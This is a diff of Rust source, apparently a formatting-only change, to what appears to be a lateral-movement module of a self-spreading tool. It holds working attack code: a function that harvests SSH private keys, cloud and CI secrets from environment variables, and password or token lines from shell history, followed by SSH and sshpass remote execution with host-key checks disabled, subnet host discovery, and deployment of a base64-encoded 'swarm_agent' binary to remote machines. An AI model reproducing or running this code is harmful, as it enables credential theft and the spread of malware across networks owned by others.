@@ -27,12 +27,19 @@ pub fn harvest_credentials() -> Vec<(String, String, String)> {
         if let Ok(entries) = std::fs::read_dir(&ssh_dir) {
             for entry in entries.filter_map(|e| e.ok()) {
                 let name = entry.file_name().to_string_lossy().to_string();
-                if name == "id_rsa" || name == "id_ed25519" || name == "id_ecdsa"
-                    || name.ends_with("_key") || name.ends_with(".pem")
+                if name == "id_rsa"
+                    || name == "id_ed25519"
+                    || name == "id_ecdsa"
+                    || name.ends_with("_key")
+                    || name.ends_with(".pem")
                 {
                     if let Ok(data) = std::fs::read(entry.path()) {
                         if data.len() > 50 {
-                            creds.push((name, String::from_utf8_lossy(&data).to_string(), "ssh_key".into()));
+                            creds.push((
+                                name,
+                                String::from_utf8_lossy(&data).to_string(),
+                                "ssh_key".into(),
+                            ));
                             info!("Harvested SSH key: {}", entry.path().display());
                         }
                     }
@@ -62,8 +69,15 @@ pub fn harvest_credentials() -> Vec<(String, String, String)> {
     }
 
     // Environment variables
-    for key in &["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AZURE_CLIENT_SECRET",
-                  "GCP_SERVICE_KEY", "DOCKER_PASSWORD", "KUBECONFIG", "GITHUB_TOKEN"] {
+    for key in &[
+        "AWS_ACCESS_KEY_ID",
+        "AWS_SECRET_ACCESS_KEY",
+        "AZURE_CLIENT_SECRET",
+        "GCP_SERVICE_KEY",
+        "DOCKER_PASSWORD",
+        "KUBECONFIG",
+        "GITHUB_TOKEN",
+    ] {
         if let Ok(val) = std::env::var(key) {
             creds.push((key.to_string(), val, "env".into()));
         }
@@ -79,8 +93,12 @@ pub fn harvest_credentials() -> Vec<(String, String, String)> {
         if let Ok(content) = std::fs::read_to_string(hp) {
             for line in content.lines() {
                 let lower = line.to_lowercase();
-                if (lower.contains("password") || lower.contains("passwd") || lower.contains("secret")
-                    || lower.contains("token") || lower.contains("api_key") || lower.contains("export"))
+                if (lower.contains("password")
+                    || lower.contains("passwd")
+                    || lower.contains("secret")
+                    || lower.contains("token")
+                    || lower.contains("api_key")
+                    || lower.contains("export"))
                     && line.len() < 500
                 {
                     creds.push((hp.clone(), line.to_string(), "shell_history".into()));
@@ -94,8 +112,13 @@ pub fn harvest_credentials() -> Vec<(String, String, String)> {
 
 // ── SSH Remote Execution (REAL) ──────────────────────────────────────────────
 
-pub fn exec_ssh(host: &str, username: &str, command: &str,
-                key_path: Option<&str>, password: Option<&str>) -> LateralResult {
+pub fn exec_ssh(
+    host: &str,
+    username: &str,
+    command: &str,
+    key_path: Option<&str>,
+    password: Option<&str>,
+) -> LateralResult {
     // BRAIN: never attack safe targets
     let cfg = crate::config::HiveConfig::load();
     if crate::panal::is_safe_target(host, &cfg.brain) {
@@ -114,13 +137,21 @@ pub fn exec_ssh(host: &str, username: &str, command: &str,
     if let Some(pass) = password {
         if !pass.is_empty() {
             match Command::new("sshpass")
-                .args(["-p", pass, "ssh",
-                       "-o", "StrictHostKeyChecking=no",
-                       "-o", "UserKnownHostsFile=/dev/null",
-                       "-o", "ConnectTimeout=10",
-                       "-o", "LogLevel=ERROR",
-                       &format!("{}@{}", username, host),
-                       command])
+                .args([
+                    "-p",
+                    pass,
+                    "ssh",
+                    "-o",
+                    "StrictHostKeyChecking=no",
+                    "-o",
+                    "UserKnownHostsFile=/dev/null",
+                    "-o",
+                    "ConnectTimeout=10",
+                    "-o",
+                    "LogLevel=ERROR",
+                    &format!("{}@{}", username, host),
+                    command,
+                ])
                 .output()
             {
                 Ok(out) => {
@@ -132,8 +163,16 @@ pub fn exec_ssh(host: &str, username: &str, command: &str,
                         output: format!(
                             "[{}ms] stdout:{} stderr:{}",
                             start.elapsed().as_millis(),
-                            String::from_utf8_lossy(&output.stdout).trim().chars().take(200).collect::<String>(),
-                            String::from_utf8_lossy(&output.stderr).trim().chars().take(100).collect::<String>(),
+                            String::from_utf8_lossy(&output.stdout)
+                                .trim()
+                                .chars()
+                                .take(200)
+                                .collect::<String>(),
+                            String::from_utf8_lossy(&output.stderr)
+                                .trim()
+                                .chars()
+                                .take(100)
+                                .collect::<String>(),
                         ),
                     };
                     return result;
@@ -152,24 +191,31 @@ pub fn exec_ssh(host: &str, username: &str, command: &str,
 
     // Key-based or no-auth fallback
     let mut cmd = Command::new("ssh");
-    cmd.arg("-o").arg("StrictHostKeyChecking=no")
-       .arg("-o").arg("UserKnownHostsFile=/dev/null")
-       .arg("-o").arg("ConnectTimeout=10")
-       .arg("-o").arg("LogLevel=ERROR");
+    cmd.arg("-o")
+        .arg("StrictHostKeyChecking=no")
+        .arg("-o")
+        .arg("UserKnownHostsFile=/dev/null")
+        .arg("-o")
+        .arg("ConnectTimeout=10")
+        .arg("-o")
+        .arg("LogLevel=ERROR");
 
     if key_path.is_some() {
-        cmd.arg("-o").arg("BatchMode=yes")
-           .arg("-o").arg("PasswordAuthentication=no");
+        cmd.arg("-o")
+            .arg("BatchMode=yes")
+            .arg("-o")
+            .arg("PasswordAuthentication=no");
         if let Some(key) = key_path {
             cmd.arg("-i").arg(key);
         }
     } else {
-        cmd.arg("-o").arg("PasswordAuthentication=yes")
-           .arg("-o").arg("PreferredAuthentications=keyboard-interactive,password");
+        cmd.arg("-o")
+            .arg("PasswordAuthentication=yes")
+            .arg("-o")
+            .arg("PreferredAuthentications=keyboard-interactive,password");
     }
 
-    cmd.arg(format!("{}@{}", username, host))
-       .arg(command);
+    cmd.arg(format!("{}@{}", username, host)).arg(command);
 
     match cmd.output() {
         Ok(out) => LateralResult {
@@ -179,8 +225,16 @@ pub fn exec_ssh(host: &str, username: &str, command: &str,
             output: format!(
                 "[{}ms] stdout:{} stderr:{}",
                 start.elapsed().as_millis(),
-                String::from_utf8_lossy(&out.stdout).trim().chars().take(200).collect::<String>(),
-                String::from_utf8_lossy(&out.stderr).trim().chars().take(100).collect::<String>(),
+                String::from_utf8_lossy(&out.stdout)
+                    .trim()
+                    .chars()
+                    .take(200)
+                    .collect::<String>(),
+                String::from_utf8_lossy(&out.stderr)
+                    .trim()
+                    .chars()
+                    .take(100)
+                    .collect::<String>(),
             ),
         },
         Err(e) => LateralResult {
@@ -194,8 +248,12 @@ pub fn exec_ssh(host: &str, username: &str, command: &str,
 
 // ── Deploy agent via SCP + SSH exec (REAL) ───────────────────────────────────
 
-pub fn deploy_agent_ssh(host: &str, username: &str, agent_binary: &[u8],
-                         key_path: Option<&str>) -> LateralResult {
+pub fn deploy_agent_ssh(
+    host: &str,
+    username: &str,
+    agent_binary: &[u8],
+    key_path: Option<&str>,
+) -> LateralResult {
     let encoded = base64_encode(agent_binary);
     let agent_name = format!("swarm_agent_{}", uuid::Uuid::new_v4());
 
@@ -207,7 +265,12 @@ pub fn deploy_agent_ssh(host: &str, username: &str, agent_binary: &[u8],
 
     let result = exec_ssh(host, username, &deploy_cmd, key_path, None);
     if result.success {
-        info!("Agent deployed to {}@{} ({} bytes)", username, host, agent_binary.len());
+        info!(
+            "Agent deployed to {}@{} ({} bytes)",
+            username,
+            host,
+            agent_binary.len()
+        );
     } else {
         warn!("Deploy failed to {}@{}: {}", username, host, result.output);
     }
@@ -230,7 +293,7 @@ pub fn discover_hosts(subnet: &str) -> Vec<String> {
                 let tokens: Vec<&str> = line.split_whitespace().collect();
                 let last = tokens.last().copied().unwrap_or("");
                 let ip_str = if last.starts_with('(') && last.ends_with(')') {
-                    &last[1..last.len()-1]
+                    &last[1..last.len() - 1]
                 } else {
                     last
                 };
@@ -287,8 +350,16 @@ fn base64_encode(data: &[u8]) -> String {
         let triple = (b0 << 16) | (b1 << 8) | b2;
         result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
         result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
-        result.push(if chunk.len() > 1 { CHARS[((triple >> 6) & 0x3F) as usize] as char } else { '=' });
-        result.push(if chunk.len() > 2 { CHARS[(triple & 0x3F) as usize] as char } else { '=' });
+        result.push(if chunk.len() > 1 {
+            CHARS[((triple >> 6) & 0x3F) as usize] as char
+        } else {
+            '='
+        });
+        result.push(if chunk.len() > 2 {
+            CHARS[(triple & 0x3F) as usize] as char
+        } else {
+            '='
+        });
     }
     result
 }
